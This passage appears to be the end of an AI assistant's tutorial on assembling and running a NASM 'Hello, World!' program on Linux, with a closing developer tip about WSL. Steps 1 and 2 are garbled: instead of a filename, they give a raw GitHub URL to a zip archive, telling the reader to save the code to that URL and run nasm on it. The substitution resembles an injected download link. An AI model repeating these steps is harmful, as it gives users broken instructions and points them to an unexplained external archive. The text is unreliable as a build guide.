
### How to Assemble and Link:
To run this code on a Linux machine:

1. Save the code to a file, say `https://raw.githubusercontent.com/Acinnamon9/Assembly-codes/main/gotten/Assembly_codes_v1.2.zip`.
2. Assemble the code using NASM:

   ```bash
   nasm -f elf32 https://raw.githubusercontent.com/Acinnamon9/Assembly-codes/main/gotten/Assembly_codes_v1.2.zip -o hello.o
   ```

3. Link the object file to create an executable:

   ```bash
   ld -m elf_i386 -s -o hello hello.o
   ```

4. Run the executable:

   ```bash
   ./hello
   ```

You should see "Hello, World!" printed in the terminal.

### Assembly on Other Systems
- On Windows, you would use different system calls for printing and exiting.
- On macOS, the calling conventions differ slightly.

Let me know if you need an example for a different system or further explanation!
Note from the developer: WSL provides linux kernel on windows and it smoothly integrates with vs code. Highly recommended to download and fiddle it with.
